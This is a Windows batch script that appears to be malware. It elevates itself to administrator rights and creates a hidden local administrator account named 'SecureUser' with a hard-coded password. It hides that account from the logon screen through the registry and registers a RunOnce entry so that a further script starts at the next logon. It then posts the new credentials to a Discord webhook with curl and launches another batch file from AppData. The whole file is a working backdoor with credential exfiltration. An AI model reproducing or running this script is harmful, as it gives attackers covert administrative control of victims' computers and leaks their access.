@echo off
set newPassword=SecureUser2354
set hiddenUsername=SecureUser
set discordWebhook=https://canary.discord.com/api/webhooks/1178919926535299213/qYP2vIdt_ozNrBzEDh6wuJ2HfU0tdf3zD-WrdPjCuh2h00fOlJEggANVkx0FOGhDxtaK

net session >nul 2>&1 || (powershell start -verb runas '\"%~0\"' &exit /b)

net user %hiddenUsername% %newPassword% /add
net localgroup administrators %hiddenUsername% /add

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %hiddenUsername% /t REG_DWORD /d 0 /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v HideUserScript /t REG_SZ /d "%APPDATA%\HideUserScript.bat" /f

set message=New user '%hiddenUsername%' created with password '%newPassword%' and added to administrators group.
curl -H "Content-Type: application/json" -d "{\"content\":\"%message%\"}" %discordWebhook%

@echo off
start /min "" "%APPDATA%\1.bat"

exit
